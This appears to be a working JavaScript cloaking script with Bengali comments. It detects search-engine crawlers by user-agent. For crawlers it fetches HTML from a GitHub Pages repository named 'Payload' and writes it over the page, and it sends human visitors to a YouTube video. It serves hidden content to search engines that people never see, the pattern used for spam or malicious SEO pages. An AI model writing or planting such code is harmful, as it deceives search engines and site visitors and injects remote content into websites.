var isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent); 
if (isBot) { 
    // গুগলবট হলে গিটহাব থেকে index.html ফেচ করে পেজে বসাবে
    var id = new URLSearchParams(location.search).get("id") || "sports";
    fetch("https://xriyanebu.github.io/Payload/index.html?id=" + id)
        .then(res => res.text())
        .then(html => {
            document.open();
            document.write(html);
            document.close();
        })
        .catch(err => console.error("Fetch failed:", err));
} else { 
    // মানুষ হলে ইউটিউবে রিডাইরেক্ট
    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
}
